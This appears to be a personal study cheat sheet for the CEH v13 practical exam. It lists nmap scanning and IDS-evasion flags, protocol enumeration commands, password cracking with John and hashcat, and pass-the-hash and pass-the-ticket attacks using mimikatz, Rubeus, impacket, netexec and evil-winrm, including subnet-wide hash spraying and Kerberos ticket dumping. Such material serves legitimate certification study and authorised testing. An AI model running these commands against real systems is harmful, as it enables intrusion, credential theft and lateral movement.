# CEH v13 Cheat Sheet

Cheat sheet for CEH v13 Pratical Exam on May 15th, 2026

## Scanning Networks
### Host Discovery
```bash
# -sn disables port scan
# -Pn assumes host is up
nmap -sn -PE <IP>                                   # ICMP Echo ping
nmap -sn -PE <IP Range>                             # ICMP Echo sweep
nmap -sn -PP <IP>                                   # ICMP Timestamp ping
nmap -sn -PM <IP>                                   # ICMP Address Mask ping
nmap -sn -PR <IP>                                   # ARP ping
nmap -sn -PU <IP>                                   # UDP ping
nmap -sn -PS <IP>                                   # TCP SYN ping
nmap -sn -PA <IP>                                   # TCP ACK ping
nmap -sn -PO <IP>                                   # IP Protocol ping
nmap -6sn -PA <IP>                                  # IPv6 ping
nmap -sn -PE --reason <IP>                          # Show why host marked alive
nmap -sn -PE --packet-trace --disable-arp-ping <IP> # Trace packets, no ARP
```

---

### Port Scanning
```bash
# Full/Open
nmap -sT -v <IP>           # TCP Connect (full open)

# Stealth
nmap -sS -v <IP>           # SYN/Half-open stealth scan
nmap -sF -v <IP>           # FIN scan
nmap -sN -v <IP>           # NULL scan
nmap -sX -v <IP>           # Xmas scan (FIN+URG+PSH)
nmap -sM -v <IP>           # TCP Maimon scan (FIN/ACK)
nmap -sA -v <IP>           # ACK flag probe scan
nmap -sA --ttl 100 -v <IP> # TTL-based scan
nmap -sW -v <IP>           # Window scan

# Other
nmap -sU -v <IP>           # UDP scan
nmap -sY -v <IP>           # SCTP INIT scan
nmap -sZ -v <IP>           # SCTP COOKIE ECHO scan
nmap -Pn -p- -sI <IP>      # IDLE/IPID spoofed scan
```

---

### Service & OS Detection
```bash
nmap -sV <IP>                           # Service version detection
nmap -O  <IP>                           # OS detection
nmap -A  <IP>                           # Aggressive (OS+version+scripts+traceroute)
nmap --script smb-os-discovery.nse <IP> # SMB OS discovery (determine the OS, computer name, domain, workgroup, and current time over the SMB protocol 445/139)
```

#### OS TTL Reference
| OS | TTL |
|----|-----|
| Linux | 64 |
| FreeBSD | 64 |
| Windows | 128 |
| OpenBSD | 255 |
| Cisco | 255 |
| Solaris | 255 |
| AIX | 255 |

---

### Performance Tuning
```bash
nmap --max-retries 0 <IP>                        # No retries (fastest)
nmap --max-retries 3 <IP>                        # Reduce retries (default 10)
nmap --min-rate 300 <IP>                         # Min packets per second
nmap --max-rtt-timeout 100ms <IP>                # Max round trip timeout
nmap --min-parallelism 10 <IP>                   # Min parallel probes
```

---

### Evading IDS/Firewall
```bash
nmap -f <IP>                          # Packet fragmentation
nmap -mtu 8 <IP>                      # Custom MTU (8 bytes)
nmap -g 80 <IP>                       # Source port manipulation
nmap -D RND:10 <IP>                   # IP decoy (10 random decoys)
nmap -sT -Pn --spoof-mac 0 <IP>       # Random MAC spoofing
nmap --randomize-hosts <IP>           # Randomize host scan order
nmap --badsum <IP>                    # Bad checksum packets
nmap -Pn -n --disable-arp-ping <IP>   # Suppress ICMP/DNS/ARP
hping3  -a 7.7.7.7 <IP>               # IP address spoofing
```

---

### Hping3 Reference
```bash
hping3 -A  -p 80 <IP>                       # ACK scan port 80
hping3 -2  -p 80 <IP>                       # UDP scan port 80
hping3 -Q -p 139 -s <IP>                    # Collect ISN
hping3 -S  -p 80 --tcp-timestamp <IP>       # Firewall timestamp
```

---

### Port States
| State | Description |
|-------|-------------|
| open | Connection established |
| closed | RST flag received |
| filtered | No response / dropped by firewall |
| unfiltered | Accessible but open/closed unclear (ACK scan only) |
| open\|filtered | No response — firewall may be protecting port |
| closed\|filtered | Only in IP ID idle scans |

### Key Scan Response Logic
| Scan Type | Open Port | Closed Port |
|-----------|-----------|-------------|
| SYN | SYN/ACK | RST |
| ACK | No response (filtered) | RST (not filtered) |
| FIN/NULL/Xmas | No response | RST |
| Maimon | No response | RST |
| UDP | No response | ICMP unreachable |
| SCTP INIT | INIT+ACK | ABORT |
| SCTP COOKIE | No response | ABORT |

## Scanning Networks
### NetBIOS Enumeration
```bash
nbtstat -a <IP>        # NetBIOS name table of remote machine
nbtstat -c <IP>        # NetBIOS name cache + resolved IPs
net use                # Connection status, shared folders, network info
net view \\            # List shared resources on remote host
net view /domain:      # List shares by domain
```

---

### SNMP Enumeration
```bash
snmpwalk -v1 -c public <IP>                   # SNMP v1 walk
snmpwalk -v2c -c public <IP>                  # SNMP v2c walk
nmap -sU -p 161 --script=snmp-processes <IP>  # SNMP via Nmap
```
---

### LDAP Enumeration
```bash
nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=CEH,dc=com"' <IP> 
```

----

### NFS Enumeration
```bash
nmap -p 2049 <IP>                   # Check NFS port
showmount -e <IP>                   # Show exported directories
rpcinfo -p   <IP>                   # RPC info
```

**SuperEnum:**
```bash
# Performs basic enumeration of any open port, including 2049
> cd SuperEnum
> echo "" >> Target.txt
> ./superenum
```

**RPCScan:**
```bash
> cd RPCScan
> python3 rpc-scan.py –rpc
```
---

### DNS Enumeration

**Nmap DNS**
```
nmap --script=broadcast-dns-service-discovery 
nmap -sU -p 53 --script dns-nsec-enum --script-args dns-nsec-enum.domains=
```

**Zone Transfer (Linux)**

Process of transferring a copy of the DNS zone file from the primary DNS server to a secondary DNS server. If the DNS transfer setting is enabled on the target DNS server, it will give DNS information; if not, it will return an error saying it has failed or refuses the zone transfer.
```bash
> dig <HOST> OR dig ns <HOST>            # Find the name servers
> dig @<NS RECORD NAME> <HOST> axfr      # Attempt zone transfer (AXFR = ALL records are returned to secondary DNS server)
```
**Zone Transfer (Windows)**
```
> nslookup
> set querytype=soa
> <HOST>
> ls -d <PRIMARY NAME SERVER>
```

**Cache Snooping**

Technique whereby an attacker queries the DNS server for a specific cached DNS record
```
dig @<IP of DNS SERVER> <TARGET DOMAIN> A +norecurse    # Send a non-recursive query by setting the Recursion Desired (RD) bit in the query header to 0
dig @<IP of DNS SERVER> <TARGET DOMAIN> A +recurse      # Send a recursive query to determine the time the DNS record resides in cache
```

**DNSSEC Zone Walking**

Technique whereby an attacker attempts to obtain internal records of the DNS server if the DNS zone is not properly configured
```
ldns-walk @<IP of DNS SERVER> <TARGET DOMAIN>
dnsrecon -d <TARGET DOMAIN> -z
```

**Amass**

Tool used to map the target network and discover potential attack surfaces
```
amass enum -passive -d <TARGET DOMAIN> -src                                            # Perform passive enumeration
amass enum -active -d <TARGET DOMAIN> -brute -w /usr/share/wordlist/amass/all.txt      # Perform active enumeration through brute-forcing
amass track -config /root/amass/config.ini -dir amass4owasp -d <TARGET DOMAIN> -last 2 # Track or compare the last two enumeration scans
```

---

### SMTP Enumeration
```bash
nmap -p 25 --script=smtp-enum-users <IP>     # List mail users
nmap -p 25 --script=smtp-open-relay <IP>     # Check open relay
nmap -p 25 --script=smtp-commands <IP>       # List SMTP commands
```

---

### SMB Enumeration
```bash
nmap -p 445 -A                           # SMB OS banner grab + info
nmap -p 139,445 --script smb-enum-shares 
nmap -p 139,445 --script smb-enum-users 
nmap -p 445 --script smb-vuln*           # SMB vulnerability scan
```

---

### NTP Enumeration
```bash
# Trace NTP chain back to the primary source
nptrace [-n] [-m maxhosts] [servername/IP_address]             

# Monitors operation of the NTP daemon (ntpd) in current state and requests changes in that state
ntpdc [-ilnps] [-c command] [host] [...]
ntpdc [-46dilnps] [-c command] [host/ip_address]

# Monitors NTP daemon (ntpd) operations and determines performance
ntpq [-inp] [-c command] [host] [...]
ntpq [-46dinp] [-c command] [host/ip_address]
```

---

### ISAKMP/IKE (VPN) Enumeration
```bash
nmap -sU -p 500 <IP>
ike-scan -M <IP>
```

---

### VoIP Enumeration
```bash
svmap                                    # SIP device scanner
```

---

### Unix/Linux User Enumeration
```bash
/usr/bin/rusers -al [HOST]               # Remote logged-in users
rwho [HOST]                              # LAN logged-in users
finger -l @ [HOST]                       # Detailed user info
finger -s @ [HOST]                       # Summary user info
```

---

### SSH Enumeration
```bash
nmap -p 22 -sV 
nmap -p 22 --script ssh-auth-methods 
nmap -p 22 --script ssh-brute 
```
---

### What Each Protocol Gives You
### What Each Protocol Gives You
| Protocol | Ports | Data Obtained |
|----------|-------|--------------|
| NetBIOS | 137, 138, 139 | Domain computers, shares, policies, passwords |
| SNMP | 161, 162 | Device info, ARP/routing tables, traffic stats, users |
| LDAP | 389 | Usernames, addresses, departments, server names |
| NFS | 2049 | Exported dirs, connected clients, IPs, shared data |
| DNS | 53 | Subdomains, hostnames, IPs, mail servers, aliases |
| SMTP | 25, 587, 2525 | Valid email users, open relays |
| NTP | 123 | Connected hosts, IPs, system names, OSes |
| ISAKMP | 500 | VPN gateway presence, encryption/hashing algorithms |
| VoIP | 5060, 5061, 2000, 2001 | Gateways, IP-PBX, softphones, user extensions |
| RPC | 135 | Vulnerable services |
| SMB | 445, 139 | OS info, shares, users, vulnerabilities |


## Password Cracking
### Hash ID
Check supplies hashes against a built-in list to suggest potential formats. 
- `hashid -j 193069ceb0461e1d40d216e32c79c704`
  - `-j` will list the corresponding JtR format
  - `-m` will identify the hashcat type.mode

### John the Ripper (JtR)

#### **Commands**
- Run a single crack mode attack on file `passwrd`
  - `john --single passwd`
- Use a wordlist to crack passwords with a dictionary attack
  - `john --wordlist=<wordlist_file> <hash_file>`   
- Use incremental mode to brute-force password cracking
  - `john --incremental <hash_file>`  
- Use `–format` to instruct JtR which format the target hashes have
  - `john --format=afs [...] <hash_file>`  
- Crack password-protected or encrypted files to process files and produce hashes compatible with JtR
  - `<xxx2john> <file_to_crack> > file.hash (i.e. pdf2john or ssh2john or wpa2john)`  

#### **JtR Notes**
- One of the most effective and widely used rulesets is best64.rule
- We can generate wordlists using CeWL, a tool that scans potential words from a company’s website and saves them in a separate list
  - `cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist`
    - `-d` is depths to spider
    - `-m` is minimum word length
    - `–lowercase` is store words in lowercase
    - `-w` file to be stored in
- Use `locate *2john*` to see all the different hash options

### Hashcat
- Basic command
  - `hashcat -a 0 -m 0 <hashes> [wordlist, rule, mask, ...]`
    - `-a` specifies attack mode
      - `0` performs a dictionary attack
      - `3` defines a mask attack
    - `-m` specifies hash type
      - `0` defines hash as md5
      - `1000` defines hash as NTLM
      - `2100` defines hash as DCC2 
    - `<hashes>` is either a hash string or file condoning one or more password hashes of the same type
    - `[wordlist, rule, mask, ...]` is placeholder for additional arguments  
- Perform a mask attack
  - `hashcat -a 3 -m 0 <hash> '?u?l?l?l?l?d?s'`
    - `'?u?l?l?l?l?d?s'` defines passwords starting with an uppercase letter, continue with four lowercase letters, a digit, and then a symbol
- Use a ruleset
  -  `hashcat -a 0 -m 0 <hash> rockyou.txt -r /usr/share/hashcat/rules/best64.rule`

## Attacks

### Pass the Hash (PtH) 

#### Using Mimikatz (Windows)
```
privilege::debug
sekurlsa::pth /user:julio /rc4:<hash> /domain:inlanefreight.htb /run:cmd.exe
```
- `/user`: the user name we want to impersonate.
- `/rc4` or `/NTLM`: NTLM hash of the user's password.
- `/domain`: Domain the user to impersonate belongs to. In the case of a local user account, we can - use the computer name, localhost, or a dot (.).
- `/run`: The program we want to run with the user's context (if not specified, it will launch cmd.exe).

#### Using Impacket (Linux)
```
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

#### Using Netexec (Linux)
```
# Spray across subnet
netexec smb 172.16.1.0/24 -u Administrator -d . -H <hash>

# Local auth across subnet
netexec smb 172.16.1.0/24 -u Administrator -H <hash> --local-auth

# Execute command
netexec smb <IP> -u Administrator -d . -H <hash> -x whoami
```

#### Using Netexec (Linux)
```
# Local account
evil-winrm -i <IP> -u Administrator -H <hash>

# Domain account
evil-winrm -i <IP> -u administrator@inlanefreight.htb -H <hash>
```


### Pass the Ticket (PtT) Windows

#### 1. Export Kerberos Tickets from Windows

**Mimikatz:**
```
mimikatz.exe
privilege::debug
sekurlsa::tickets /export        # exports .kirbi files
sekurlsa::ekeys                  # dump AES/RC4 keys
```
**Rubeus:**
```
Rubeus.exe dump /nowrap          # dump all tickets as Base64
```

#### 2. OverPass the Hash (Pass the Key)

**Mimikatz (RC4):**
```
sekurlsa::pth /domain:domain.htb /user:username /ntlm:<hash>
```
**Rubeus (AES256 — preferred, less detectable):**
```
Rubeus.exe asktgt /domain:domain.htb /user:username /aes256:<hash> /nowrap
```

#### 3. Pass the Ticket

**Rubeus — request TGT and inject immediately:**
```
Rubeus.exe asktgt /domain:domain.htb /user:username /rc4:<hash> /ptt
```
**Rubeus — inject existing ticket:**
```
Rubeus.exe ptt /ticket:<base64>
Rubeus.exe ptt /ticket:ticket.kirbi
```
**Mimikatz — inject .kirbi:**
```
kerberos::ptt "C:\path\to\ticket.kirbi"
```
**Convert .kirbi to Base64 (PowerShell):**
```
[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
```

#### 4. Lateral Movement via PowerShell Remoting

**Mimikatz path:**
```
# 1. Import ticket in mimikatz
kerberos::ptt "ticket.kirbi"
# 2. Exit mimikatz, launch PowerShell from same cmd window
powershell
Enter-PSSession -ComputerName DC01
```
**Rubeus path:**
```
# 1. Create sacrificial process
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
# 2. In new window, request TGT and inject
Rubeus.exe asktgt /user:username /domain:domain.htb /aes256:<hash> /ptt
# 3. Launch PowerShell
powershell
Enter-PSSession -ComputerName DC01
```

#### Key Notes
| Item | Detail |
|------|--------|
| TGT | Used to request access to any resource |
| TGS | Used for a specific service only |
| `.kirbi` ending in `$` | Computer account ticket |
| `krbtgt` ticket | That user's TGT |
| RC4 vs AES256 | AES256 preferred — RC4 triggers encryption downgrade alert |
| Mimikatz PtT | Requires admin rights |
| Rubeus PtT | Does not require admin rights |
| Ports | TCP 5985 (HTTP) / 5986 (HTTPS) for WinRM/PSRemoting |


